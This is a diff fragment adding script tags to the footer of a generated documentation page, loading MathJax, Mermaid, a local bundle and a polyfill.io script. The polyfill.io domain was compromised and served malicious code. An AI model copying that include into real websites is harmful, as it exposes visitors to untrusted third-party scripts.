+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+      
+    
+  </body>
+</html>
